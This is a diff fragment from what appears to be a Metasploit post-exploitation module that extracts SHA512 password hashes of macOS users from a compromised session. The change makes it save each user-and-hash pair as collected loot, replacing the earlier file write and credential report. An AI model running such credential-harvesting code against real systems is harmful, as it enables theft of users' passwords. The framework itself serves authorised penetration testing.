@@ -521,15 +521,15 @@ class Metasploit3 < Msf::Post
 					sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
 
 					print_status("SHA512:#{user}:#{sha512}")
-					file_local_write(sha1_file,"#{user}:#{sha512}")
-					report_auth_info(
-						:host   => host,
-						:port   => 0,
-						:sname  => 'sha512',
-						:user   => user,
-						:pass   => sha512,
-						:active => true
+					p = store_loot(
+						'osx.hash.sha512',
+						'text/plain',
+						session,
+						"#{user}:#{sha512}",
+						user
 					)
+					print_status("SHA512 Hash saved as: #{p}")
+
 					# Reset hash value
 					sha512 = ""
 
